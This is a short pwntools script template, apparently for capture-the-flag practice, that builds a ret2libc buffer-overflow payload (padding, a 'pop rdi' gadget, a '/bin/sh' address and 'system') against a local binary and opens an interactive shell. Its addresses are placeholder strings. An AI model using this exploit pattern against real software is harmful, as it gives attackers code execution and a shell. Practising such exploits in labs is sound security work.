from pwn import *

offset = "your offset"
pop_rdi = "your pop rdi addr"
bin_sh = "your bin/sh addr"
system = "your system addr"
ret = "your ret gadget"

payload = b"A"*offset + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(ret) # or p32 if it is 32 binary

p = process("./binary name")

p.send(payload)
p.interactive()